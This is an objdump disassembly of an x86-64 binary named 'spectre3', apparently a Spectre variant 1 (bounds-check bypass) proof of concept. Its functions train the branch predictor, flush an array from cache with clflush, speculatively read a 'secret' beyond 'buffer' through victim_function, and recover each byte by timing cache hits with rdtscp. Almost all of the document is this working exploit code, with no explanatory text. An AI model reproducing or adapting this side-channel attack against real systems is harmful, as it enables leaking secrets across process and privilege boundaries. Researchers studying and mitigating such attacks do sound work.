
spectre3:     file format elf64-x86-64


Disassembly of section .init:

0000000000000560 <_init>:
 560:	48 83 ec 08          	sub    $0x8,%rsp
 564:	48 8b 05 7d 0a 20 00 	mov    0x200a7d(%rip),%rax        # 200fe8 <__gmon_start__>
 56b:	48 85 c0             	test   %rax,%rax
 56e:	74 02                	je     572 <_init+0x12>
 570:	ff d0                	callq  *%rax
 572:	48 83 c4 08          	add    $0x8,%rsp
 576:	c3                   	retq   

Disassembly of section .plt:

0000000000000580 <.plt>:
 580:	ff 35 2a 0a 20 00    	pushq  0x200a2a(%rip)        # 200fb0 <_GLOBAL_OFFSET_TABLE_+0x8>
 586:	ff 25 2c 0a 20 00    	jmpq   *0x200a2c(%rip)        # 200fb8 <_GLOBAL_OFFSET_TABLE_+0x10>
 58c:	0f 1f 40 00          	nopl   0x0(%rax)

0000000000000590 <free@plt>:
 590:	ff 25 2a 0a 20 00    	jmpq   *0x200a2a(%rip)        # 200fc0 <free@GLIBC_2.2.5>
 596:	68 00 00 00 00       	pushq  $0x0
 59b:	e9 e0 ff ff ff       	jmpq   580 <.plt>

00000000000005a0 <printf@plt>:
 5a0:	ff 25 22 0a 20 00    	jmpq   *0x200a22(%rip)        # 200fc8 <printf@GLIBC_2.2.5>
 5a6:	68 01 00 00 00       	pushq  $0x1
 5ab:	e9 d0 ff ff ff       	jmpq   580 <.plt>

00000000000005b0 <malloc@plt>:
 5b0:	ff 25 1a 0a 20 00    	jmpq   *0x200a1a(%rip)        # 200fd0 <malloc@GLIBC_2.2.5>
 5b6:	68 02 00 00 00       	pushq  $0x2
 5bb:	e9 c0 ff ff ff       	jmpq   580 <.plt>

Disassembly of section .plt.got:

00000000000005c0 <__cxa_finalize@plt>:
 5c0:	ff 25 32 0a 20 00    	jmpq   *0x200a32(%rip)        # 200ff8 <__cxa_finalize@GLIBC_2.2.5>
 5c6:	66 90                	xchg   %ax,%ax

Disassembly of section .text:

00000000000005d0 <_start>:
 5d0:	31 ed                	xor    %ebp,%ebp
 5d2:	49 89 d1             	mov    %rdx,%r9
 5d5:	5e                   	pop    %rsi
 5d6:	48 89 e2             	mov    %rsp,%rdx
 5d9:	48 83 e4 f0          	and    $0xfffffffffffffff0,%rsp
 5dd:	50                   	push   %rax
 5de:	54                   	push   %rsp
 5df:	4c 8d 05 fa 04 00 00 	lea    0x4fa(%rip),%r8        # ae0 <__libc_csu_fini>
 5e6:	48 8d 0d 83 04 00 00 	lea    0x483(%rip),%rcx        # a70 <__libc_csu_init>
 5ed:	48 8d 3d e6 00 00 00 	lea    0xe6(%rip),%rdi        # 6da <main>
 5f4:	ff 15 e6 09 20 00    	callq  *0x2009e6(%rip)        # 200fe0 <__libc_start_main@GLIBC_2.2.5>
 5fa:	f4                   	hlt    
 5fb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)

0000000000000600 <deregister_tm_clones>:
 600:	48 8d 3d 09 0b 20 00 	lea    0x200b09(%rip),%rdi        # 201110 <__TMC_END__>
 607:	55                   	push   %rbp
 608:	48 8d 05 01 0b 20 00 	lea    0x200b01(%rip),%rax        # 201110 <__TMC_END__>
 60f:	48 39 f8             	cmp    %rdi,%rax
 612:	48 89 e5             	mov    %rsp,%rbp
 615:	74 19                	je     630 <deregister_tm_clones+0x30>
 617:	48 8b 05 ba 09 20 00 	mov    0x2009ba(%rip),%rax        # 200fd8 <_ITM_deregisterTMCloneTable>
 61e:	48 85 c0             	test   %rax,%rax
 621:	74 0d                	je     630 <deregister_tm_clones+0x30>
 623:	5d                   	pop    %rbp
 624:	ff e0                	jmpq   *%rax
 626:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)
 62d:	00 00 00 
 630:	5d                   	pop    %rbp
 631:	c3                   	retq   
 632:	0f 1f 40 00          	nopl   0x0(%rax)
 636:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)
 63d:	00 00 00 

0000000000000640 <register_tm_clones>:
 640:	48 8d 3d c9 0a 20 00 	lea    0x200ac9(%rip),%rdi        # 201110 <__TMC_END__>
 647:	48 8d 35 c2 0a 20 00 	lea    0x200ac2(%rip),%rsi        # 201110 <__TMC_END__>
 64e:	55                   	push   %rbp
 64f:	48 29 fe             	sub    %rdi,%rsi
 652:	48 89 e5             	mov    %rsp,%rbp
 655:	48 c1 fe 03          	sar    $0x3,%rsi
 659:	48 89 f0             	mov    %rsi,%rax
 65c:	48 c1 e8 3f          	shr    $0x3f,%rax
 660:	48 01 c6             	add    %rax,%rsi
 663:	48 d1 fe             	sar    %rsi
 666:	74 18                	je     680 <register_tm_clones+0x40>
 668:	48 8b 05 81 09 20 00 	mov    0x200981(%rip),%rax        # 200ff0 <_ITM_registerTMCloneTable>
 66f:	48 85 c0             	test   %rax,%rax
 672:	74 0c                	je     680 <register_tm_clones+0x40>
 674:	5d                   	pop    %rbp
 675:	ff e0                	jmpq   *%rax
 677:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
 67e:	00 00 
 680:	5d                   	pop    %rbp
 681:	c3                   	retq   
 682:	0f 1f 40 00          	nopl   0x0(%rax)
 686:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)
 68d:	00 00 00 

0000000000000690 <__do_global_dtors_aux>:
 690:	80 3d 89 0a 20 00 00 	cmpb   $0x0,0x200a89(%rip)        # 201120 <completed.7697>
 697:	75 2f                	jne    6c8 <__do_global_dtors_aux+0x38>
 699:	48 83 3d 57 09 20 00 	cmpq   $0x0,0x200957(%rip)        # 200ff8 <__cxa_finalize@GLIBC_2.2.5>
 6a0:	00 
 6a1:	55                   	push   %rbp
 6a2:	48 89 e5             	mov    %rsp,%rbp
 6a5:	74 0c                	je     6b3 <__do_global_dtors_aux+0x23>
 6a7:	48 8b 3d 5a 09 20 00 	mov    0x20095a(%rip),%rdi        # 201008 <__dso_handle>
 6ae:	e8 0d ff ff ff       	callq  5c0 <__cxa_finalize@plt>
 6b3:	e8 48 ff ff ff       	callq  600 <deregister_tm_clones>
 6b8:	c6 05 61 0a 20 00 01 	movb   $0x1,0x200a61(%rip)        # 201120 <completed.7697>
 6bf:	5d                   	pop    %rbp
 6c0:	c3                   	retq   
 6c1:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
 6c8:	f3 c3                	repz retq 
 6ca:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)

00000000000006d0 <frame_dummy>:
 6d0:	55                   	push   %rbp
 6d1:	48 89 e5             	mov    %rsp,%rbp
 6d4:	5d                   	pop    %rbp
 6d5:	e9 66 ff ff ff       	jmpq   640 <register_tm_clones>

00000000000006da <main>:
 6da:	55                   	push   %rbp
 6db:	48 89 e5             	mov    %rsp,%rbp
 6de:	48 83 ec 20          	sub    $0x20,%rsp
 6e2:	c7 45 e0 00 00 00 00 	movl   $0x0,-0x20(%rbp)
 6e9:	eb 24                	jmp    70f <main+0x35>
 6eb:	8b 45 e0             	mov    -0x20(%rbp),%eax
 6ee:	99                   	cltd   
 6ef:	c1 ea 18             	shr    $0x18,%edx
 6f2:	01 d0                	add    %edx,%eax
 6f4:	0f b6 c0             	movzbl %al,%eax
 6f7:	29 d0                	sub    %edx,%eax
 6f9:	89 c1                	mov    %eax,%ecx
 6fb:	8b 45 e0             	mov    -0x20(%rbp),%eax
 6fe:	48 63 d0             	movslq %eax,%rdx
 701:	48 8d 05 38 0a 20 00 	lea    0x200a38(%rip),%rax        # 201140 <array>
 708:	88 0c 02             	mov    %cl,(%rdx,%rax,1)
 70b:	83 45 e0 01          	addl   $0x1,-0x20(%rbp)
 70f:	81 7d e0 ff ff 0f 00 	cmpl   $0xfffff,-0x20(%rbp)
 716:	7e d3                	jle    6eb <main+0x11>
 718:	c7 45 e4 00 00 00 00 	movl   $0x0,-0x1c(%rbp)
 71f:	e9 b1 00 00 00       	jmpq   7d5 <main+0xfb>
 724:	c7 45 e8 00 00 00 00 	movl   $0x0,-0x18(%rbp)
 72b:	eb 1a                	jmp    747 <main+0x6d>
 72d:	8b 45 e8             	mov    -0x18(%rbp),%eax
 730:	c1 e0 0c             	shl    $0xc,%eax
 733:	48 63 d0             	movslq %eax,%rdx
 736:	48 8d 05 03 0a 20 00 	lea    0x200a03(%rip),%rax        # 201140 <array>
 73d:	48 01 d0             	add    %rdx,%rax
 740:	0f ae 38             	clflush (%rax)
 743:	83 45 e8 01          	addl   $0x1,-0x18(%rbp)
 747:	81 7d e8 ff 00 00 00 	cmpl   $0xff,-0x18(%rbp)
 74e:	7e dd                	jle    72d <main+0x53>
 750:	0f ae f0             	mfence 
 753:	bf 00 04 00 00       	mov    $0x400,%edi
 758:	e8 53 fe ff ff       	callq  5b0 <malloc@plt>
 75d:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
 761:	c7 45 ec 00 00 00 00 	movl   $0x0,-0x14(%rbp)
 768:	eb 1e                	jmp    788 <main+0xae>
 76a:	8b 45 ec             	mov    -0x14(%rbp),%eax
 76d:	48 98                	cltq   
 76f:	48 8d 14 85 00 00 00 	lea    0x0(,%rax,4),%rdx
 776:	00 
 777:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
 77b:	48 01 d0             	add    %rdx,%rax
 77e:	c7 00 00 00 00 00    	movl   $0x0,(%rax)
 784:	83 45 ec 01          	addl   $0x1,-0x14(%rbp)
 788:	81 7d ec ff 00 00 00 	cmpl   $0xff,-0x14(%rbp)
 78f:	7e d9                	jle    76a <main+0x90>
 791:	8b 45 e4             	mov    -0x1c(%rbp),%eax
 794:	48 98                	cltq   
 796:	48 8d 0d 43 09 20 00 	lea    0x200943(%rip),%rcx        # 2010e0 <secret>
 79d:	48 8d 15 9c 08 20 00 	lea    0x20089c(%rip),%rdx        # 201040 <buffer>
 7a4:	48 29 d1             	sub    %rdx,%rcx
 7a7:	48 89 ca             	mov    %rcx,%rdx
 7aa:	48 01 d0             	add    %rdx,%rax
 7ad:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
 7b1:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
 7b5:	89 c2                	mov    %eax,%edx
 7b7:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
 7bb:	89 d6                	mov    %edx,%esi
 7bd:	48 89 c7             	mov    %rax,%rdi
 7c0:	e8 e4 01 00 00       	callq  9a9 <steal_byte>
 7c5:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
 7c9:	48 89 c7             	mov    %rax,%rdi
 7cc:	e8 bf fd ff ff       	callq  590 <free@plt>
 7d1:	83 45 e4 01          	addl   $0x1,-0x1c(%rbp)
 7d5:	83 7d e4 27          	cmpl   $0x27,-0x1c(%rbp)
 7d9:	0f 8e 45 ff ff ff    	jle    724 <main+0x4a>
 7df:	b8 00 00 00 00       	mov    $0x0,%eax
 7e4:	c9                   	leaveq 
 7e5:	c3                   	retq   

00000000000007e6 <find_cached_index>:
 7e6:	55                   	push   %rbp
 7e7:	48 89 e5             	mov    %rsp,%rbp
 7ea:	53                   	push   %rbx
 7eb:	48 89 7d e0          	mov    %rdi,-0x20(%rbp)
 7ef:	c7 45 ec 00 00 00 00 	movl   $0x0,-0x14(%rbp)
 7f6:	eb 5a                	jmp    852 <find_cached_index+0x6c>
 7f8:	48 c7 45 f0 00 00 00 	movq   $0x0,-0x10(%rbp)
 7ff:	00 
 800:	8b 45 ec             	mov    -0x14(%rbp),%eax
 803:	c1 e0 0c             	shl    $0xc,%eax
 806:	48 63 d0             	movslq %eax,%rdx
 809:	48 8d 05 30 09 20 00 	lea    0x200930(%rip),%rax        # 201140 <array>
 810:	48 01 d0             	add    %rdx,%rax
 813:	48 89 c3             	mov    %rax,%rbx
 816:	0f ae f0             	mfence 
 819:	0f 01 f9             	rdtscp 
 81c:	49 89 c2             	mov    %rax,%r10
 81f:	48 8b 0b             	mov    (%rbx),%rcx
 822:	0f 01 f9             	rdtscp 
 825:	4c 29 d0             	sub    %r10,%rax
 828:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
 82c:	48 83 7d f0 77       	cmpq   $0x77,-0x10(%rbp)
 831:	77 1b                	ja     84e <find_cached_index+0x68>
 833:	8b 45 ec             	mov    -0x14(%rbp),%eax
 836:	48 98                	cltq   
 838:	48 8d 14 85 00 00 00 	lea    0x0(,%rax,4),%rdx
 83f:	00 
 840:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
 844:	48 01 d0             	add    %rdx,%rax
 847:	8b 10                	mov    (%rax),%edx
 849:	83 c2 01             	add    $0x1,%edx
 84c:	89 10                	mov    %edx,(%rax)
 84e:	83 45 ec 01          	addl   $0x1,-0x14(%rbp)
 852:	81 7d ec ff 00 00 00 	cmpl   $0xff,-0x14(%rbp)
 859:	7e 9d                	jle    7f8 <find_cached_index+0x12>
 85b:	90                   	nop
 85c:	5b                   	pop    %rbx
 85d:	5d                   	pop    %rbp
 85e:	c3                   	retq   

000000000000085f <find_highest_score>:
 85f:	55                   	push   %rbp
 860:	48 89 e5             	mov    %rsp,%rbp
 863:	48 83 ec 20          	sub    $0x20,%rsp
 867:	48 89 7d e8          	mov    %rdi,-0x18(%rbp)
 86b:	c7 45 f4 00 00 00 00 	movl   $0x0,-0xc(%rbp)
 872:	c7 45 f8 00 00 00 00 	movl   $0x0,-0x8(%rbp)
 879:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%rbp)
 880:	eb 3e                	jmp    8c0 <find_highest_score+0x61>
 882:	8b 45 fc             	mov    -0x4(%rbp),%eax
 885:	48 98                	cltq   
 887:	48 8d 14 85 00 00 00 	lea    0x0(,%rax,4),%rdx
 88e:	00 
 88f:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
 893:	48 01 d0             	add    %rdx,%rax
 896:	8b 00                	mov    (%rax),%eax
 898:	39 45 f4             	cmp    %eax,-0xc(%rbp)
 89b:	7d 1f                	jge    8bc <find_highest_score+0x5d>
 89d:	8b 45 fc             	mov    -0x4(%rbp),%eax
 8a0:	89 45 f8             	mov    %eax,-0x8(%rbp)
 8a3:	8b 45 fc             	mov    -0x4(%rbp),%eax
 8a6:	48 98                	cltq   
 8a8:	48 8d 14 85 00 00 00 	lea    0x0(,%rax,4),%rdx
 8af:	00 
 8b0:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
 8b4:	48 01 d0             	add    %rdx,%rax
 8b7:	8b 00                	mov    (%rax),%eax
 8b9:	89 45 f4             	mov    %eax,-0xc(%rbp)
 8bc:	83 45 fc 01          	addl   $0x1,-0x4(%rbp)
 8c0:	81 7d fc ff 00 00 00 	cmpl   $0xff,-0x4(%rbp)
 8c7:	7e b9                	jle    882 <find_highest_score+0x23>
 8c9:	8b 4d f4             	mov    -0xc(%rbp),%ecx
 8cc:	8b 55 f8             	mov    -0x8(%rbp),%edx
 8cf:	8b 45 f8             	mov    -0x8(%rbp),%eax
 8d2:	89 c6                	mov    %eax,%esi
 8d4:	48 8d 3d 1d 02 00 00 	lea    0x21d(%rip),%rdi        # af8 <_IO_stdin_used+0x8>
 8db:	b8 00 00 00 00       	mov    $0x0,%eax
 8e0:	e8 bb fc ff ff       	callq  5a0 <printf@plt>
 8e5:	90                   	nop
 8e6:	c9                   	leaveq 
 8e7:	c3                   	retq   

00000000000008e8 <train_victim>:
 8e8:	55                   	push   %rbp
 8e9:	48 89 e5             	mov    %rsp,%rbp
 8ec:	48 83 ec 10          	sub    $0x10,%rsp
 8f0:	c7 45 f4 00 00 00 00 	movl   $0x0,-0xc(%rbp)
 8f7:	eb 6b                	jmp    964 <train_victim+0x7c>
 8f9:	8b 4d f4             	mov    -0xc(%rbp),%ecx
 8fc:	ba 67 66 66 66       	mov    $0x66666667,%edx
 901:	89 c8                	mov    %ecx,%eax
 903:	f7 ea                	imul   %edx
 905:	c1 fa 02             	sar    $0x2,%edx
 908:	89 c8                	mov    %ecx,%eax
 90a:	c1 f8 1f             	sar    $0x1f,%eax
 90d:	29 c2                	sub    %eax,%edx
 90f:	89 d0                	mov    %edx,%eax
 911:	c1 e0 02             	shl    $0x2,%eax
 914:	01 d0                	add    %edx,%eax
 916:	01 c0                	add    %eax,%eax
 918:	29 c1                	sub    %eax,%ecx
 91a:	89 ca                	mov    %ecx,%edx
 91c:	48 63 c2             	movslq %edx,%rax
 91f:	48 89 c7             	mov    %rax,%rdi
 922:	e8 09 01 00 00       	callq  a30 <victim_function>
 927:	c7 45 f8 00 00 00 00 	movl   $0x0,-0x8(%rbp)
 92e:	eb 1a                	jmp    94a <train_victim+0x62>
 930:	8b 45 f8             	mov    -0x8(%rbp),%eax
 933:	c1 e0 0c             	shl    $0xc,%eax
 936:	48 63 d0             	movslq %eax,%rdx
 939:	48 8d 05 00 08 20 00 	lea    0x200800(%rip),%rax        # 201140 <array>
 940:	48 01 d0             	add    %rdx,%rax
 943:	0f ae 38             	clflush (%rax)
 946:	83 45 f8 01          	addl   $0x1,-0x8(%rbp)
 94a:	81 7d f8 ff 00 00 00 	cmpl   $0xff,-0x8(%rbp)
 951:	7e dd                	jle    930 <train_victim+0x48>
 953:	0f ae f0             	mfence 
 956:	48 8d 05 c3 06 20 00 	lea    0x2006c3(%rip),%rax        # 201020 <bufferSize>
 95d:	0f ae 38             	clflush (%rax)
 960:	83 45 f4 01          	addl   $0x1,-0xc(%rbp)
 964:	83 7d f4 13          	cmpl   $0x13,-0xc(%rbp)
 968:	7e 8f                	jle    8f9 <train_victim+0x11>
 96a:	0f ae e8             	lfence 
 96d:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%rbp)
 974:	eb 1a                	jmp    990 <train_victim+0xa8>
 976:	8b 45 fc             	mov    -0x4(%rbp),%eax
 979:	c1 e0 0c             	shl    $0xc,%eax
 97c:	48 63 d0             	movslq %eax,%rdx
 97f:	48 8d 05 ba 07 20 00 	lea    0x2007ba(%rip),%rax        # 201140 <array>
 986:	48 01 d0             	add    %rdx,%rax
 989:	0f ae 38             	clflush (%rax)
 98c:	83 45 fc 01          	addl   $0x1,-0x4(%rbp)
 990:	81 7d fc ff 00 00 00 	cmpl   $0xff,-0x4(%rbp)
 997:	7e dd                	jle    976 <train_victim+0x8e>
 999:	0f ae f0             	mfence 
 99c:	48 8d 05 7d 06 20 00 	lea    0x20067d(%rip),%rax        # 201020 <bufferSize>
 9a3:	0f ae 38             	clflush (%rax)
 9a6:	90                   	nop
 9a7:	c9                   	leaveq 
 9a8:	c3                   	retq   

00000000000009a9 <steal_byte>:
 9a9:	55                   	push   %rbp
 9aa:	48 89 e5             	mov    %rsp,%rbp
 9ad:	48 83 ec 20          	sub    $0x20,%rsp
 9b1:	48 89 7d e8          	mov    %rdi,-0x18(%rbp)
 9b5:	89 75 e4             	mov    %esi,-0x1c(%rbp)
 9b8:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%rbp)
 9bf:	eb 27                	jmp    9e8 <steal_byte+0x3f>
 9c1:	b8 00 00 00 00       	mov    $0x0,%eax
 9c6:	e8 1d ff ff ff       	callq  8e8 <train_victim>
 9cb:	8b 45 e4             	mov    -0x1c(%rbp),%eax
 9ce:	48 98                	cltq   
 9d0:	48 89 c7             	mov    %rax,%rdi
 9d3:	e8 58 00 00 00       	callq  a30 <victim_function>
 9d8:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
 9dc:	48 89 c7             	mov    %rax,%rdi
 9df:	e8 02 fe ff ff       	callq  7e6 <find_cached_index>
 9e4:	83 45 fc 01          	addl   $0x1,-0x4(%rbp)
 9e8:	81 7d fc e7 03 00 00 	cmpl   $0x3e7,-0x4(%rbp)
 9ef:	7e d0                	jle    9c1 <steal_byte+0x18>
 9f1:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
 9f5:	48 89 c7             	mov    %rax,%rdi
 9f8:	e8 62 fe ff ff       	callq  85f <find_highest_score>
 9fd:	90                   	nop
 9fe:	c9                   	leaveq 
 9ff:	c3                   	retq   

0000000000000a00 <leakByteNoinlineFunction>:
 a00:	55                   	push   %rbp
 a01:	48 89 e5             	mov    %rsp,%rbp
 a04:	89 f8                	mov    %edi,%eax
 a06:	88 45 fc             	mov    %al,-0x4(%rbp)
 a09:	0f b6 45 fc          	movzbl -0x4(%rbp),%eax
 a0d:	c1 e0 0c             	shl    $0xc,%eax
 a10:	48 63 d0             	movslq %eax,%rdx
 a13:	48 8d 05 26 07 20 00 	lea    0x200726(%rip),%rax        # 201140 <array>
 a1a:	0f b6 14 02          	movzbl (%rdx,%rax,1),%edx
 a1e:	0f b6 05 fc 06 20 00 	movzbl 0x2006fc(%rip),%eax        # 201121 <temp>
 a25:	21 d0                	and    %edx,%eax
 a27:	88 05 f4 06 20 00    	mov    %al,0x2006f4(%rip)        # 201121 <temp>
 a2d:	90                   	nop
 a2e:	5d                   	pop    %rbp
 a2f:	c3                   	retq   

0000000000000a30 <victim_function>:
 a30:	55                   	push   %rbp
 a31:	48 89 e5             	mov    %rsp,%rbp
 a34:	48 83 ec 08          	sub    $0x8,%rsp
 a38:	48 89 7d f8          	mov    %rdi,-0x8(%rbp)
 a3c:	8b 05 de 05 20 00    	mov    0x2005de(%rip),%eax        # 201020 <bufferSize>
 a42:	48 98                	cltq   
 a44:	48 39 45 f8          	cmp    %rax,-0x8(%rbp)
 a48:	73 1b                	jae    a65 <victim_function+0x35>
 a4a:	48 8d 15 ef 05 20 00 	lea    0x2005ef(%rip),%rdx        # 201040 <buffer>
 a51:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
 a55:	48 01 d0             	add    %rdx,%rax
 a58:	0f b6 00             	movzbl (%rax),%eax
 a5b:	0f b6 c0             	movzbl %al,%eax
 a5e:	89 c7                	mov    %eax,%edi
 a60:	e8 9b ff ff ff       	callq  a00 <leakByteNoinlineFunction>
 a65:	90                   	nop
 a66:	c9                   	leaveq 
 a67:	c3                   	retq   
 a68:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
 a6f:	00 

0000000000000a70 <__libc_csu_init>:
 a70:	41 57                	push   %r15
 a72:	41 56                	push   %r14
 a74:	49 89 d7             	mov    %rdx,%r15
 a77:	41 55                	push   %r13
 a79:	41 54                	push   %r12
 a7b:	4c 8d 25 26 03 20 00 	lea    0x200326(%rip),%r12        # 200da8 <__frame_dummy_init_array_entry>
 a82:	55                   	push   %rbp
 a83:	48 8d 2d 26 03 20 00 	lea    0x200326(%rip),%rbp        # 200db0 <__init_array_end>
 a8a:	53                   	push   %rbx
 a8b:	41 89 fd             	mov    %edi,%r13d
 a8e:	49 89 f6             	mov    %rsi,%r14
 a91:	4c 29 e5             	sub    %r12,%rbp
 a94:	48 83 ec 08          	sub    $0x8,%rsp
 a98:	48 c1 fd 03          	sar    $0x3,%rbp
 a9c:	e8 bf fa ff ff       	callq  560 <_init>
 aa1:	48 85 ed             	test   %rbp,%rbp
 aa4:	74 20                	je     ac6 <__libc_csu_init+0x56>
 aa6:	31 db                	xor    %ebx,%ebx
 aa8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
 aaf:	00 
 ab0:	4c 89 fa             	mov    %r15,%rdx
 ab3:	4c 89 f6             	mov    %r14,%rsi
 ab6:	44 89 ef             	mov    %r13d,%edi
 ab9:	41 ff 14 dc          	callq  *(%r12,%rbx,8)
 abd:	48 83 c3 01          	add    $0x1,%rbx
 ac1:	48 39 dd             	cmp    %rbx,%rbp
 ac4:	75 ea                	jne    ab0 <__libc_csu_init+0x40>
 ac6:	48 83 c4 08          	add    $0x8,%rsp
 aca:	5b                   	pop    %rbx
 acb:	5d                   	pop    %rbp
 acc:	41 5c                	pop    %r12
 ace:	41 5d                	pop    %r13
 ad0:	41 5e                	pop    %r14
 ad2:	41 5f                	pop    %r15
 ad4:	c3                   	retq   
 ad5:	90                   	nop
 ad6:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)
 add:	00 00 00 

0000000000000ae0 <__libc_csu_fini>:
 ae0:	f3 c3                	repz retq 

Disassembly of section .fini:

0000000000000ae4 <_fini>:
 ae4:	48 83 ec 08          	sub    $0x8,%rsp
 ae8:	48 83 c4 08          	add    $0x8,%rsp
 aec:	c3                   	retq   
